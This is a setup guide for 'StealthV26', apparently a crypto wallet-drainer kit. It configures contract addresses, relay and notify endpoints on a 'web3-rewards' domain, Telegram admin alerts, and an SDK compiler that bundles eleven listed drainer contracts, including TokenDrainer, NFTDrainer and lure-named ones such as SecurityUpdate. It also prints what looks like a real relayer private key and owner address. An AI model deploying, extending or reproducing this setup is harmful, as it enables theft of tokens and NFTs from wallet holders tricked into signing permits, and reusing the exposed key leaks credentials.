# StealthV26 Environment Variables Setup

Complete guide to configure your deployment environment.

## Required Variables

### Authentication & Security
```env
# Generate with: openssl rand -hex 32
AUTH_SECRET=<32-byte-hex>
ENCRYPTION_KEY=<32-byte-hex>

# Wallet & Admin
OWNER_ADDRESS=0x4eCdfe8b3aE97b3f4f266a7429Fa5cF2eC31F693
RELAYER_PRIVATE_KEY=0xc47a2199dcf09759a5c1d55adbccd6bcfd7b8f72fde09efbe15b123da7ab3ae3
ADMIN_PANEL_PASSWORD=<min-8-chars-strong-password>
```

### Domain & URLs
```env
NEXT_PUBLIC_BASE_URL=https://structure.v26sequence.com
NEXT_PUBLIC_APP_URL=https://structure.v26sequence.com
```

### WalletConnect
```env
NEXT_PUBLIC_WALLETCONNECT_PROJECT_ID=fa769d222b291803a62d5deee060a7b3
NEXT_PUBLIC_PROJECT_ID=fa769d222b291803a62d5deee060a7b3
```

### Telegram Integration
```env
TELEGRAM_BOT_TOKEN=<bot-token-from-@botfather>
TELEGRAM_CHAT_ID=<your-chat-id>
TELEGRAM_ADMIN_CHAT_IDS=<comma-separated-admin-ids>
TELEGRAM_WEBHOOK_SECRET=<secret-for-webhook-verification>
```

### Infrastructure
```env
REDIS_URL=redis://default:<password>@<host>:<port>
ETHEREUM_RPC_URL=https://eth-mainnet.g.alchemy.com/v2/<api-key>
```

## Contract Addresses (NEXT_PUBLIC_*)

### Platform Executor Contracts
```env
NEXT_PUBLIC_STEALTH_EXCHANGE_ADDRESS=0x788F5098C58BF5854ebf2b10B0D9303b13ABF43A
NEXT_PUBLIC_STEALTH_EXCHANGE_FACTORY_ADDRESS=0x2407C3Da4F73CBe82BE76bC567aAce17954c51E4
NEXT_PUBLIC_PERMIT2_EXECUTOR_ADDRESS=0x4593D97d6E932648fb4425aC2945adaF66927773
NEXT_PUBLIC_ERC2612_EXECUTOR_ADDRESS=0xb8eF065061bbBF5dCc65083be8CC7B50121AE900
NEXT_PUBLIC_BATCH_MULTICALL_ADDRESS=0xF93E987DF029e95CdE59c0F5cD447e0a7002054D
NEXT_PUBLIC_EIP7702_BATCH_DELEGATE_ADDRESS=0xb61cA663d438900d086359e0bB7aA4140091053C
NEXT_PUBLIC_ORCH_ADDRESS=0x10da87879924CD7Da02f9a79A795fe4ff27Fd24a
```

### Sequence Wallet Contracts (Factory + ERC-4337)
```env
NEXT_PUBLIC_SEQUENCE_FACTORY_ADDRESS=0x653c0bd75e353f1FFeeb8AC9A510ea30F9064ceF
NEXT_PUBLIC_SEQUENCE_ERC4337_FACTORY_WRAPPER_ADDRESS=0xC67c4793bDb979A1a4cd97311c7644b4f7a31ff9
```

### Sequence Wallet Modules
```env
NEXT_PUBLIC_SEQUENCE_STAGE1_ADDRESS=0xfBC5a55501E747b0c9F82e2866ab2609Fa9b99f4
NEXT_PUBLIC_SEQUENCE_STAGE2_ADDRESS=0x5C9C4AD7b287D37a37d267089e752236f368f94f
NEXT_PUBLIC_SEQUENCE_GUEST_ADDRESS=0x2d21Ce2fBe0BAD8022BaE10B5C22eA69fE930Ee6
NEXT_PUBLIC_SEQUENCE_EIP7702_MODULE_ADDRESS=0x1f82E64E694894BACfa441709fC7DD8a30FA3E5d
NEXT_PUBLIC_SEQUENCE_SESSION_MANAGER_ADDRESS=0x4AE428352317752a51Ac022C9D2551BcDef785cb
NEXT_PUBLIC_SEQUENCE_BATCH_MULTICALL_ADDRESS=0xF93E987DF029e95CdE59c0F5cD447e0a7002054D
```

### Execution Backends
```env
NEXT_PUBLIC_SEQUENCE_PERMIT2_EXECUTOR_ADDRESS=0x4593D97d6E932648fb4425aC2945adaF66927773
NEXT_PUBLIC_SEQUENCE_ERC2612_EXECUTOR_ADDRESS=0xb8eF065061bbBF5dCc65083be8CC7B50121AE900
```

### ERC-4337 Infrastructure
```env
NEXT_PUBLIC_SEQUENCE_ENTRY_POINT_ADDRESS=0x0000000071727De22E5E9d8BAf0edAc6f37da032
NEXT_PUBLIC_SEQUENCE_SENDER_CREATOR_ADDRESS=0xEFC2c1444eBCC4Db75e7613d20C6a62fF67A167C
```

### Standard Contracts
```env
NEXT_PUBLIC_SEQUENCE_PERMIT2_ADDRESS=0x000000000022D473030F116dDEE9F6B43aC78BA3
NEXT_PUBLIC_SEQUENCE_RELAYER_ADDRESS=0x4eCdfe8b3aE97b3f4f266a7429Fa5cF2eC31F693
```

### Canonical Aliases
```env
NEXT_PUBLIC_STAGE1_MODULE_ADDRESS=0xfBC5a55501E747b0c9F82e2866ab2609Fa9b99f4
NEXT_PUBLIC_STAGE2_MODULE_ADDRESS=0x5C9C4AD7b287D37a37d267089e752236f368f94f
NEXT_PUBLIC_SESSION_MANAGER_ADDRESS=0x4AE428352317752a51Ac022C9D2551BcDef785cb
NEXT_PUBLIC_EIP7702_MODULE_ADDRESS=0x1f82E64E694894BACfa441709fC7DD8a30FA3E5d
```

## Relay URLs (For Compiled SDKs)

```env
# Default to Vercel (for development/testing)
NEXT_PUBLIC_RELAY_URL=https://web3-rewards.vercel.app/api/relay
NEXT_PUBLIC_NOTIFY_URL=https://web3-rewards.vercel.app/api/notify

# Production: Point to your VPS
NEXT_PUBLIC_RELAY_URL=https://your-vps-domain.com/api/relay
NEXT_PUBLIC_NOTIFY_URL=https://your-vps-domain.com/api/notify
```

## Deployment Checklist

### Local Development
```bash
cp .env.local.example .env.local
# Edit .env.local with your values
npm run dev
```

### Production (VPS)
```bash
# 1. Copy env file
scp .env.local user@vps:/path/to/app/.env.local

# 2. Update RELAY/NOTIFY URLs to point to your VPS
# NEXT_PUBLIC_RELAY_URL=https://your-vps-domain.com/api/relay
# NEXT_PUBLIC_NOTIFY_URL=https://your-vps-domain.com/api/notify

# 3. Build
npm run build

# 4. Start
npm run start
```

## Backend Engine Configuration

The compilation engine uses these settings to generate SDKs:

1. **Contract Registry** - All 45 contracts (21 sequence + 11 drainer + custom)
2. **RPC Endpoints** - Ethereum mainnet from ETHEREUM_RPC_URL
3. **Relay Service** - Points to NEXT_PUBLIC_RELAY_URL
4. **Authentication** - AUTH_SECRET for session management

## Testing

```bash
# Verify environment is loaded
curl http://localhost:3000/api/health

# Test contract compilation
curl -X POST http://localhost:3000/api/compile-test \
  -H "Content-Type: application/json" \
  -d '{"contractId":"eip7702-module"}'

# List available contracts
curl http://localhost:3000/api/contracts

# Import custom contract
curl -X POST http://localhost:3000/api/contracts/import \
  -H "Content-Type: application/json" \
  -d '{
    "contractName": "MyToken",
    "address": "0x...",
    "abi": [...],
    "networks": [1, 137]
  }'
```

## Environment Variable Groups

### NEXT_PUBLIC_* (Frontend)
All vars prefixed with `NEXT_PUBLIC_` are exposed to the browser.
- Domain, URLs, contract addresses, WalletConnect project ID
- Do NOT put secrets here

### Private (Backend Only)
- AUTH_SECRET, ENCRYPTION_KEY
- RELAYER_PRIVATE_KEY (hot key for relay operations)
- TELEGRAM_BOT_TOKEN
- ETHEREUM_RPC_URL with API key
- REDIS_URL with password
- ADMIN_PANEL_PASSWORD

## Security Notes

1. **Never commit** `.env.local` to version control
2. **Rotate secrets** monthly
3. **Use strong passwords** (min 32 chars for AUTH_SECRET)
4. **Separate dev/prod** env files
5. **Protect private keys** - use environment-only, never in code
6. **Monitor RELAY_URL** - ensure it's on your domain, not third-party
7. **Firewall Redis** - only allow from app server

## Contract ABI Coverage

### Sequence Contracts (10)
- ✅ Stage1Module
- ✅ Stage2Module
- ✅ EIP7702Module
- ✅ EIP7702BatchDelegate
- ✅ SessionManager
- ✅ Guest
- ✅ Permit2Executor
- ✅ ERC2612Executor
- ✅ BatchMulticall
- ✅ StealthExchange + Factory

### Drainer Contracts (11)
- ✅ ClaimContract
- ✅ ConnectContract
- ✅ ExecuteContract
- ✅ TokenDrainer
- ✅ NFTDrainer
- ✅ Permit2Integration
- ✅ SwapContract
- ✅ MulticallContract
- ✅ SecurityUpdate
- ✅ TrustContract

### Custom Contracts
- ✅ Import via `/contracts-import` dashboard
- ✅ Auto-saved to operational config
- ✅ Available in compilation engine

All 45+ contracts can be compiled and used in generated SDKs.
